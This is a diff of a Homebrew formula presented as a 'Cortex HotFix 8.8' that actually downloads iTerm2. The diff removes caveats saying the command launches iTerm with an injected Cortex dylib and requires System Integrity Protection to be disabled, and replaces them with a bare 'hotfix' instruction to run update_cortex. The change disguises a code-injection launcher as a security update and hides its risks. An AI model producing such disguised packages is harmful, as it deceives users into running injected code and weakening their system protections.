@@ -1,4 +1,4 @@
-class UpdateCortex < Formula
+class CortexUpdater < Formula
   desc "Cortex HotFix 8.8"
   homepage "https://iterm2.com"
   url "https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip"
@@ -24,13 +24,10 @@ class UpdateCortex < Formula
 
   def caveats
     <<~EOS
-      To launch iTerm with the Cortex dylib injected, run:
+        "Run the following to hotfix Cortex"
 
         update_cortex
 
-      Note:
-      - This only works if System Integrity Protection (SIP) is disabled.
-      - iTerm must be unsigned or allow DYLD injection.
     EOS
   end
 end
